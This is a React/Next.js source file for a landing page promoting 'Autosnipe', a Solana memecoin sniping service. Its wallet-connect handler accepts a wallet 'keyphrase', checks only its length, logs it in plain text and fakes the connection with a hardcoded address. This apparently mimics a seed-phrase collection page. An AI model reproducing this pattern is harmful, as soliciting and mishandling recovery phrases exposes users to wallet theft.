"use client";
import Image from "next/image";
import { useState, Component } from "react";
import { IoWallet } from "react-icons/io5";
import WalletModal from "@/components/connectModal";
import GetStarted from "@/components/getstarted";
import MemeCoins from "@/app/memes";

// Error Boundary Component
class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error("Component Error:", error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="w-full max-w-md mx-auto p-4 bg-red-900/20 rounded-lg border border-red-500 text-red-100">
          <h3 className="font-bold text-lg mb-2">Something went wrong</h3>
          <p className="mb-4">{this.state.error?.message || "An error occurred"}</p>
          <button
            onClick={() => this.setState({ hasError: false })}
            className="bg-red-600 hover:bg-red-700 px-4 py-2 rounded"
          >
            Try Again
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Safe Components with Error Boundaries
const SafeMemeCoins = () => (
  <ErrorBoundary>
    <MemeCoins />
  </ErrorBoundary>
);

const SafeWalletModal = ({ isOpen, onClose }) => (
  <ErrorBoundary>
    <WalletModal isOpen={isOpen} onClose={onClose} />
  </ErrorBoundary>
);

const SafeGetStarted = () => (
  <ErrorBoundary>
    <GetStarted />
  </ErrorBoundary>
);

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false);
  const [connectedWallet, setConnectedWallet] = useState(null);
  const [walletAddress, setWalletAddress] = useState("");
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [connectionError, setConnectionError] = useState(null);

  const handleConnect = async (walletId, keyphrase = null) => {
    try {
      setConnectionError(null);

      if (walletId === "software" && keyphrase) {
        if (!isValidKeyphrase(keyphrase)) {
          throw new Error("Invalid keyphrase format");
        }

        console.log("Connecting with keyphrase:", keyphrase);
        setConnectedWallet("software");
        setWalletAddress("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");
      } else {
        await connectWallet(walletId);
        setConnectedWallet(walletId);
        setWalletAddress("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");
      }
    } catch (error) {
      console.error("Wallet connection error:", error);
      setConnectionError(error.message || "Failed to connect wallet");
      setConnectedWallet(null);
      setWalletAddress("");
    }
  };

  const disconnectWallet = () => {
    try {
      setConnectedWallet(null);
      setWalletAddress("");
      setConnectionError(null);
    } catch (error) {
      console.error("Wallet disconnection error:", error);
      setConnectionError("Failed to disconnect wallet");
    }
  };

  const openWalletModal = () => {
    setIsWalletModalOpen(true);
  };

  const closeWalletModal = () => {
    setIsWalletModalOpen(false);
    setConnectionError(null);
  };

  const isValidKeyphrase = (phrase) => {
    return phrase && phrase.length >= 8;
  };

  const connectWallet = async (walletId) => {
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        if (Math.random() > 0.1) {
          resolve();
        } else {
          reject(new Error("Wallet connection timed out"));
        }
      }, 1000);
    });
  };

  return (
    <ErrorBoundary>
      <section className="w-full min-h-screen text-white flex flex-col items-center justify-start py-8 sm:py-12">
        <div className="w-full max-w-5xl px-4 sm:px-6 lg:px-8 flex flex-col items-center gap-[40px] pb-[50px]">
          <h1 className="text-4xl sm:text-5xl font-bold text-center leading-tight">
            Snipe & Sell Solana Tokens at{" "}
            <i className="text-[#00cc33] font-bold">Hyperspeed!</i>
          </h1>
          <ul className="flex overflow-x-scroll justify-center gap-2 w-[90%] sm:gap-6 text-sm">
            <li className="flex items-center gap-3">
              <Image
                src="/memecoins_icon.B2QarAeS.avif"
                alt="Memecoins"
                className="w-6 h-6"
                width={24}
                height={24}
              />
              <h2 className="w-28 sm:w-40">ALL SOLANA MEMECOINS</h2>
            </li>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 25"
              width="16"
              height="16"
              className="hidden sm:block"
            >
              <path
                fill="#fff"
                fillRule="evenodd"
                d="m12.8 13.38 11.2-.8-11.2-.8L12 .7l-.8 11.08-11.2.8 11.2.8.8 11.07z"
                clipRule="evenodd"
              ></path>
            </svg>
            <li className="flex items-center gap-3">
              <Image
                src="/deposit_icon.76izqal4.avif"
                alt="Deposit"
                className="w-6 h-6"
                width={24}
                height={24}
              />
              <h2 className="w-28 sm:w-40">DEPOSIT FROM ALL CHAINS</h2>
            </li>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 25"
              width="16"
              height="16"
              className="hidden sm:block"
            >
              <path
                fill="#fff"
                fillRule="evenodd"
                d="m12.8 13.38 11.2-.8-11.2-.8L12 .7l-.8 11.08-11.2.8 11.2.8.8 11.07z"
                clipRule="evenodd"
              ></path>
            </svg>
            <li className="flex items-center gap-3">
              <Image
                src="/rug_detection_icon.BXcUJ9kG.avif"
                alt="Rug Detection"
                className="w-6 h-6"
                width={24}
                height={24}
              />
              <h2 className="w-28 sm:w-40">DETECT RUGS AUTOMATICALLY</h2>
            </li>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 25"
              width="16"
              height="16"
              className="hidden sm:block"
            >
              <path
                fill="#fff"
                fillRule="evenodd"
                d="m12.8 13.38 11.2-.8-11.2-.8L12 .7l-.8 11.08-11.2.8 11.2.8.8 11.07z"
                clipRule="evenodd"
              ></path>
            </svg>
            <li className="flex items-center gap-3">
              <Image
                src="/mev_protection_icon.0nTkU8lo.avif"
                alt="MEV Protection"
                className="w-6 h-6"
                width={24}
                height={24}
              />
              <h2 className="w-28 sm:w-40">MEV PROTECTED TRADING</h2>
            </li>
          </ul>
          <p className="text-lg sm:text-xl text-gray-400 text-center">
            Connect your wallet and start sniping memes now
          </p>
          <button
            onClick={openWalletModal}
            className="flex items-center justify-center gap-2 bg-[#00cc33] w-[314px] max-w-xs sm:max-w-sm h-14 rounded-lg font-semibold text-black text-[23px] hover:shadow-[0_0_8px_#ff0000,0_0_8px_#ff00ff,0_0_8px_#0000ff] shadow-[0_0_8px_#ff0000,0_0_8px_#ff00ff,0_0_8px_#0000ff] transition-shadow"
          >
            <IoWallet /> Connect & Snipe
          </button>
          {connectionError && (
            <div className="text-red-400 text-sm text-center">
              {connectionError}
            </div>
          )}
          <p className="text-sm text-gray-400 text-center">
            By continuing, you agree to our{" "}
            <span className="text-white">Privacy policy</span> and{" "}
            <span className="text-white">Terms of Use</span>
          </p>
        </div>
<section className="w-full px-4 sm:px-6 lg:px-8 py-12 flex overflow-x-auto justify-start gap-6 snap-x">
  <div className="flex min-w-[280px] sm:min-w-[200px] hover:border-[#00cc33] hover:border-2 bg-[url('/animated-backgro.png')] bg-cover bg-center p-6 rounded-lg font-semibold transition-all shadow-lg">
    <span className="flex flex-col gap-4 flex-1">
      <p className="text-xl sm:text-lg">Meme Vision</p>
      <p className="text-sm sm:text-xs text-gray-400">
        Find the best meme tokens and track latest migrations
      </p>
      <button className="w-32 sm:w-28 py-2 sm:py-1.5 text-sm sm:text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl transition-colors">
        Try Meme Vision
      </button>
    </span>
    <Image
      src="/memevision.png"
      alt="Meme Vision"
      className="w-28 sm:w-24 object-contain"
      width={112}
      height={112}
    />
  </div>
  <div className="flex min-w-[280px] sm:min-w-[200px] hover:border-[#00cc33] hover:border-2 bg-[url('/animated-backgro.png')] bg-cover bg-center p-6 rounded-lg font-semibold transition-all shadow-lg">
    <span className="flex flex-col gap-4 flex-1">
      <p className="text-xl sm:text-lg">Traders Lens</p>
      <p className="text-sm sm:text-xs text-gray-400">
        Find the best meme tokens and track latest migrations
      </p>
      <button className="w-32 sm:w-28 py-2 sm:py-1.5 text-sm sm:text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl transition-colors">
        Try Traders Lens
      </button>
    </span>
    <Image
      src="/bannerman.png"
      alt="Traders Lens"
      className="w-28 sm:w-24 object-contain"
      width={112}
      height={112}
    />
  </div>
  <div className="flex min-w-[280px] sm:min-w-[200px] hover:border-[#00cc33] hover:border-2 bg-[url('/animated-backgro.png')] bg-cover bg-center p-6 rounded-lg font-semibold transition-all shadow-lg">
    <span className="flex flex-col gap-4 flex-1">
      <p className="text-xl sm:text-lg">Traders Lens</p>
      <p className="text-sm sm:text-xs text-gray-400">
        Find the best meme tokens and track latest migrations
      </p>
      <button className="w-32 sm:w-28 py-2 sm:py-1.5 text-sm sm:text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl transition-colors">
        Try Traders Lens
      </button>
    </span>
    <Image
      src="/bannerman.png"
      alt="Traders Lens"
      className="w-28 sm:w-24 object-contain"
      width={112}
      height={112}
    />
  </div>
  <div className="flex min-w-[280px] sm:min-w-[200px] hover:border-[#00cc33] hover:border-2 bg-[url('/animated-backgro.png')] bg-cover bg-center p-6 rounded-lg font-semibold transition-all shadow-lg">
    <span className="flex flex-col gap-4 flex-1">
      <p className="text-xl sm:text-lg">Earn 40% on fees</p>
      <p className="text-sm sm:text-xs text-gray-400">
        Refer your friends now! They get 10% discount on fees
      </p>
      <button className="w-32 sm:w-28 py-2 sm:py-1.5 text-sm sm:text-xs rounded-full bg-black text-[#00cc33] hover:text-white hover:bg-[#00cc33] shadow-xl transition-colors">
        Refer Now
      </button>
    </span>
    <Image
      src="/trader.png"
      alt="Refer"
      className="w-28 sm:w-24 object-contain"
      width={112}
      height={112}
    />
  </div>
</section>
        <SafeMemeCoins />
        <section>
          <SafeWalletModal isOpen={isWalletModalOpen} onClose={closeWalletModal} />
        </section>
        <SafeGetStarted />
        <marquee className="bg-black font-mono py-3 w-full max-w-4xl border-t border-b border-gray-600">
          <div className="text-base flex gap-2">
            <span className="text-[#3E356B]">
              EXCLUSIVE &amp; INDUSTRY 1ST FEATURES ON AUTOSNIPE
            </span>
            <span className="text-[#00cc33]">✦</span>
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00cc33] to-white">
              AI OPTIMISED PRIORITY FEES
            </span>
            <span className="text-[#00cc33]">✦</span>
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00cc33] to-white">
              ON-CHAIN RENT REFUND
            </span>
            <span className="text-[#00cc33]">✦</span>
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00cc33] to-white">
              AI DETECTION OF POTENTIAL RUG PULL TOKENS
            </span>
            <span className="text-[#00cc33]">✦</span>
            <span className="text-[#3E356B]">
              EXCLUSIVE &amp; INDUSTRY 1ST FEATURES ON AUTOSNIPE
            </span>
          </div>
        </marquee>
      </section>
    </ErrorBoundary>
  );
}